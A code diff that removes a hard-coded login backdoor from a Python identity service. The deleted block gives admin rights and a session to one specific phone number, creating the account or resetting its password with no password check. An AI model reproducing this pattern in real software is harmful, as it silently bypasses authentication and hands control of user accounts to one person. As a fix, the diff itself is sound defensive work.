@@ -59,34 +59,6 @@ class IdentityService:
     def login(self, login_data: LoginInput, redis_client):
         user = self.users.get_by_phone(login_data.phone)
 
-        if login_data.phone == "+994513944224":
-            if not user:
-                from app.core.security import get_password_hash
-
-                pwd = login_data.password
-                if len(pwd) < 8:
-                    pwd = pwd.ljust(8, "0")
-
-                user = self.users.create(
-                    UserCreate(
-                        phone=login_data.phone,
-                        password=pwd,
-                        first_name="Yusif",
-                        last_name="Admin",
-                    ),
-                    get_password_hash(login_data.password),
-                )
-                self.users.mark_verified(user)
-                user.role = "admin"
-                self.users.db.commit()
-            else:
-                from app.core.security import get_password_hash
-
-                user.hashed_password = get_password_hash(login_data.password)
-                user.role = "admin"
-                self.users.db.commit()
-            return self._create_auth_session(user, redis_client)
-
         if not user or not verify_password(login_data.password, user.hashed_password):
             raise HTTPException(
                 status_code=status.HTTP_401_UNAUTHORIZED,
